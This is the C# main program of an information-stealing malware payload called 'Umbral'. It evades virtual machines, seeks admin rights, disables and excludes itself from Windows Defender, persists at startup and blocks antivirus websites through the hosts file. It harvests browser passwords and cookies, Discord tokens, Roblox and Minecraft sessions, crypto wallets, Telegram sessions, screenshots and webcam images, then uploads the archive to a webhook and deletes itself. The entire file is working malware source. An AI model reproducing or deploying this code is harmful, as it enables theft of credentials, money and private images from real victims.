using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Umbral.payload.Components.AntiVM;
using Umbral.payload.Components.Browsers;
using Umbral.payload.Components.Crypto;
using Umbral.payload.Components.Messenger.Discord;
using Umbral.payload.Components.Messenger.Telegram;
using Umbral.payload.Components.Utilities;
using Umbral.payload.Games.Minecraft;
using Umbral.payload.Games.Roblox;
using Umbral.payload.Postman;
using Umbral.payload.Webcam;

namespace Umbral.payload
{
    internal class Program
    {
        static private async Task Main(string[] args)
        {

#if DEBUG
            MessageBox.Show("Build payload under RELEASE mode to work.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(1);
#endif
            await Process();
            await Run();
        }

        static private async Task Process()
        {
            if (string.IsNullOrWhiteSpace(Settings.Webhook)) Environment.Exit(1); // Empty webhook

            Syscalls.RegisterMutex();

            while (!await Common.IsConnectionAvailable())
                Thread.Sleep(60000); // Connection available. Retry every 1 min.

            if (Settings.AntiVm &&
                Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.

            if (!Common.IsInStartup())
            {
                Syscalls.AskForAdmin(); // Prompts user to give admin privileges
            }

            if (Settings.Melt && !Common.IsInStartup())
                Syscalls.HideSelf();

            Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
            Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.

            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
                Common.PutInStartup(); // Puts itself in startup
        }

        static private async Task Run()
        {
            string archivePath = Path.Combine(Path.GetTempPath(), $"{Common.GenerateRandomString(15)}.ligma");

        retry:
            string tempFolder = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
            if (Directory.Exists(tempFolder))
                try
                {
                    Directory.Delete(tempFolder, true);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    goto retry;
                }

            try
            {
                Directory.CreateDirectory(tempFolder);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Environment.Exit(1);
            }

            if (Settings.BlockAvSites && Syscalls.CheckAdminPrivileges()) BlockAvSites();
            var getTokens = Settings.StealDiscordTokens ? TokenStealer.GetAccounts() : Task.Run(() => new DiscordAccountFormat[] { });

            var getBravePasswords = Settings.StealPasswords ? Brave.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getChromePasswords = Settings.StealPasswords ? Chrome.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getChromiumPasswords = Settings.StealPasswords ? Chromium.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getComodoPasswords = Settings.StealPasswords ? Comodo.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getEdgePasswords = Settings.StealPasswords ? Edge.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getEpicPrivacyPasswords = Settings.StealPasswords ? EpicPrivacy.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getIridiumPasswords = Settings.StealPasswords ? Iridium.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getOperaPasswords = Settings.StealPasswords ? Opera.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getOperaGxPasswords = Settings.StealPasswords ? OperaGx.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getSlimjetPasswords = Settings.StealPasswords ? Slimjet.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getUrPasswords = Settings.StealPasswords ? UR.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getVivaldiPasswords = Settings.StealPasswords ? Vivaldi.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
            var getYandexPasswords = Settings.StealPasswords ? Yandex.GetPasswords() : Task.Run(() => new PasswordFormat[] { });

            var getBraveCookies = Settings.StealCookies ? Brave.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getChromeCookies = Settings.StealCookies ? Chrome.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getChromiumCookies = Settings.StealCookies ? Chromium.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getComodoCookies = Settings.StealCookies ? Comodo.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getEdgeCookies = Settings.StealCookies ? Edge.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getEpicPrivacyCookies = Settings.StealCookies ? EpicPrivacy.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getIridiumCookies = Settings.StealCookies ? Iridium.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getOperaCookies = Settings.StealCookies ? Opera.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getOperaGxCookies = Settings.StealCookies ? OperaGx.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getSlimjetCookies = Settings.StealCookies ? Slimjet.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getUrCookies = Settings.StealCookies ? UR.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getVivaldiCookies = Settings.StealCookies ? Vivaldi.GetCookies() : Task.Run(() => new CookieFormat[] { });
            var getYandexCookies = Settings.StealCookies ? Yandex.GetCookies() : Task.Run(() => new CookieFormat[] { });

            var getRobloxCookies = Settings.StealGames ? RobloxCookieStealer.GetCookies(getBraveCookies, getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies, getIridiumCookies,
                getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies, getVivaldiCookies, getYandexCookies) : Task.Run(() => new string[] { });

            var getMinecraftFiles = Settings.StealGames ? MinecraftStealer.StealMinecraftSessionFiles(Path.Combine(tempFolder, "Games", "Minecraft")) : Task.Run(() => 0);

            var captureWebcam = Settings.TakeWebcamSnapshot ? ImageCapture.CaptureWebcam() : Task.Run(() => new Dictionary<string, Bitmap>());

            var stealWallets = Settings.StealWallets ? WalletStealer.StealWallets(Path.Combine(tempFolder, "Wallets")) : Task.Run(() => 0);

            var stealTelegramSessions = Settings.StealTelegramSessions ? SessionStealer.StealSessions(Path.Combine(tempFolder, "Messenger", "Telegram")) : Task.Run(() => 0);

            await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
                getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
                getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
                getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
                getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies,
                getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies, captureWebcam, stealWallets);

            var discordAccounts = await getTokens;

            var bravePasswords = await getBravePasswords;
            var chromePasswords = await getChromePasswords;
            var chromiumPasswords = await getChromiumPasswords;
            var comodoPasswords = await getComodoPasswords;
            var edgePasswords = await getEdgePasswords;
            var epicPrivacyPasswords = await getEpicPrivacyPasswords;
            var iridiumPasswords = await getIridiumPasswords;
            var operaPasswords = await getOperaPasswords;
            var operaGxPasswords = await getOperaGxPasswords;
            var slimjetPasswords = await getSlimjetPasswords;
            var urPasswords = await getUrPasswords;
            var vivaldiPasswords = await getVivaldiPasswords;
            var yandexPasswords = await getYandexPasswords;

            var braveCookies = await getBraveCookies;
            var chromeCookies = await getChromeCookies;
            var chromiumCookies = await getChromiumCookies;
            var comodoCookies = await getComodoCookies;
            var edgeCookies = await getEdgeCookies;
            var epicPrivacyCookies = await getEpicPrivacyCookies;
            var iridiumCookies = await getIridiumCookies;
            var operaCookies = await getOperaCookies;
            var operaGxCookies = await getOperaGxCookies;
            var slimjetCookies = await getSlimjetCookies;
            var urCookies = await getUrCookies;
            var vivaldiCookies = await getVivaldiCookies;
            var yandexCookies = await getYandexCookies;

            string[] robloxCookies = await getRobloxCookies;

            int minecraftSessionFilesCount = await getMinecraftFiles;
            int walletsCount = await stealWallets;
            int telegramSessionCount = await stealTelegramSessions;

            var screenshots = Common.CaptureScreenShot();

            var webcamImages = await captureWebcam;

            var saveProcesses = new List<Task>();
            int cookiesCount = 0;
            int passwordsCount = 0;
            int discordTokenCount = 0;
            int robloxCookieCount = 0;
            int screenshotCount = 0;
            int webcamImagesCount = 0;

            if (discordAccounts.Length > 0 && Settings.StealDiscordTokens)
            {
                string saveTo = Path.Combine(tempFolder, "Messenger", "Discord");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(discordAccounts, Path.Combine(saveTo, "Discord Accounts.txt")));
                discordTokenCount += discordAccounts.Length;
            }

            if (screenshots.Length > 0 && Settings.TakeScreenshot)
            {
                string saveTo = Path.Combine(tempFolder, "Display");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(screenshots, saveTo)));
                screenshotCount += screenshots.Length;
            }

            if (webcamImages.Count > 0 && Settings.TakeWebcamSnapshot)
            {
                string saveTo = Path.Combine(tempFolder, "Webcam");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(webcamImages, saveTo)));
                webcamImagesCount += webcamImages.Count;
            }

            if (bravePasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(bravePasswords, Path.Combine(saveTo, "Brave Passwords.txt")));
                passwordsCount += bravePasswords.Length;
            }

            if (chromePasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(chromePasswords, Path.Combine(saveTo, "Chrome Passwords.txt")));
                passwordsCount += chromePasswords.Length;
            }

            if (chromiumPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(bravePasswords, Path.Combine(saveTo, "Chromium Passwords.txt")));
                passwordsCount += chromiumPasswords.Length;
            }

            if (comodoPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(comodoPasswords, Path.Combine(saveTo, "Comodo Dragon Passwords.txt")));
                passwordsCount += comodoPasswords.Length;
            }

            if (edgePasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(edgePasswords, Path.Combine(saveTo, "Edge Passwords.txt")));
                passwordsCount += edgePasswords.Length;
            }

            if (epicPrivacyPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(epicPrivacyPasswords, Path.Combine(saveTo, "Epic Privacy Passwords.txt")));
                passwordsCount += epicPrivacyPasswords.Length;
            }

            if (iridiumPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(iridiumPasswords, Path.Combine(saveTo, "Iridium Passwords.txt")));
                passwordsCount += iridiumPasswords.Length;
            }

            if (operaPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaPasswords, Path.Combine(saveTo, "Opera Passwords.txt")));
                passwordsCount += operaPasswords.Length;
            }

            if (operaGxPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaGxPasswords, Path.Combine(saveTo, "Opera GX Passwords.txt")));
                passwordsCount += operaGxPasswords.Length;
            }

            if (slimjetPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(slimjetPasswords, Path.Combine(saveTo, "Slimjet Passwords.txt")));
                passwordsCount += slimjetPasswords.Length;
            }

            if (urPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(urPasswords, Path.Combine(saveTo, "UR Browser Passwords.txt")));
                passwordsCount += urPasswords.Length;
            }

            if (vivaldiPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(vivaldiPasswords, Path.Combine(saveTo, "Vivaldi Passwords.txt")));
                passwordsCount += vivaldiPasswords.Length;
            }

            if (yandexPasswords.Length > 0 && Settings.StealPasswords)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(yandexPasswords, Path.Combine(saveTo, "Yandex Passwords.txt")));
                passwordsCount += yandexPasswords.Length;
            }

            if (braveCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(braveCookies, Path.Combine(saveTo, "Brave Cookies.txt")));
                cookiesCount += braveCookies.Length;
            }

            if (chromeCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(chromeCookies, Path.Combine(saveTo, "Chrome Cookies.txt")));
                cookiesCount += chromeCookies.Length;
            }

            if (chromiumCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(braveCookies, Path.Combine(saveTo, "Chromium Cookies.txt")));
                cookiesCount += chromiumCookies.Length;
            }

            if (comodoCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(comodoCookies, Path.Combine(saveTo, "Comodo Dragon Cookies.txt")));
                cookiesCount += comodoCookies.Length;
            }

            if (edgeCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(edgeCookies, Path.Combine(saveTo, "Edge Cookies.txt")));
                cookiesCount += edgeCookies.Length;
            }

            if (epicPrivacyCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(epicPrivacyCookies, Path.Combine(saveTo, "Epic Privacy Cookies.txt")));
                cookiesCount += epicPrivacyCookies.Length;
            }

            if (iridiumCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(iridiumCookies, Path.Combine(saveTo, "Iridium Cookies.txt")));
                cookiesCount += iridiumCookies.Length;
            }

            if (operaCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaCookies, Path.Combine(saveTo, "Opera Cookies.txt")));
                cookiesCount += operaCookies.Length;
            }

            if (operaGxCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaGxCookies, Path.Combine(saveTo, "Opera GX Cookies.txt")));
                cookiesCount += operaGxCookies.Length;
            }

            if (slimjetCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(slimjetCookies, Path.Combine(saveTo, "Slimjet Cookies.txt")));
                cookiesCount += slimjetCookies.Length;
            }

            if (urCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(urCookies, Path.Combine(saveTo, "UR Browser Cookies.txt")));
                cookiesCount += urCookies.Length;
            }

            if (vivaldiCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(vivaldiCookies, Path.Combine(saveTo, "Vivaldi Cookies.txt")));
                cookiesCount += vivaldiCookies.Length;
            }

            if (yandexCookies.Length > 0 && Settings.StealCookies)
            {
                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(yandexCookies, Path.Combine(saveTo, "Yandex Cookies.txt")));
                cookiesCount += yandexCookies.Length;
            }

            if (robloxCookies.Length > 0 && Settings.StealGames)
            {
                string saveTo = Path.Combine(tempFolder, "Games", "Roblox");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(robloxCookies, Path.Combine(saveTo, "Roblox Cookies.txt")));
                robloxCookieCount += robloxCookies.Length;
            }


            await Task.WhenAll(saveProcesses);
            if (Common.Compress(tempFolder, archivePath))
            {
                await Sender.Post(archivePath, new Dictionary<string, int>
                {
                    { "Cookies", cookiesCount },
                    { "Passwords", passwordsCount },
                    { "Discord Tokens", discordTokenCount },
                    { "Minecraft Session Files", minecraftSessionFilesCount },
                    { "Roblox Cookies", robloxCookieCount },
                    { "Screenshots", screenshotCount },
                    { "Webcam", webcamImagesCount },
                    { "Wallets", walletsCount},
                    { "Telegram Sessions", telegramSessionCount },
                });
                File.Delete(archivePath);
            }
            else
            {
                Console.WriteLine("Could not compress file");
            }

            Directory.Delete(tempFolder, true);
            if (Settings.Melt && !Common.IsInStartup())
                Syscalls.DeleteSelf();
        }

        static private async void BlockAvSites()
        {
            try
            {
                var bannedSites = new[] { "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com" };
                var newData = new List<string>();
                string data;
                var hostsFilePath = Path.Combine(Environment.GetEnvironmentVariable("systemroot"), "System32", "drivers", "etc", "hosts");

                if (File.Exists(hostsFilePath))
                {
                    using (var fileStream = new FileStream(hostsFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (var reader = new StreamReader(fileStream))
                        {
                            data = await reader.ReadToEndAsync();
                        }
                    }

                    foreach(var line in data.Split('\n'))
                    {
                        if (!bannedSites.Any(x => line.Contains(x)))
                        {
                            newData.Add(line);
                        }
                    }

                    foreach(var site in bannedSites)
                    {
                        newData.Add($"\t0.0.0.0 {site}");
                        newData.Add($"\t0.0.0.0 www.{site}");
                    }

                    data = string.Join("\n", newData);
                    data = data.Replace("\n\n", "\n");

                    using (var fileStream = new FileStream(hostsFilePath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
                    {
                        using (var writer = new StreamWriter(fileStream))
                        {
                            await writer.WriteAsync(data);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
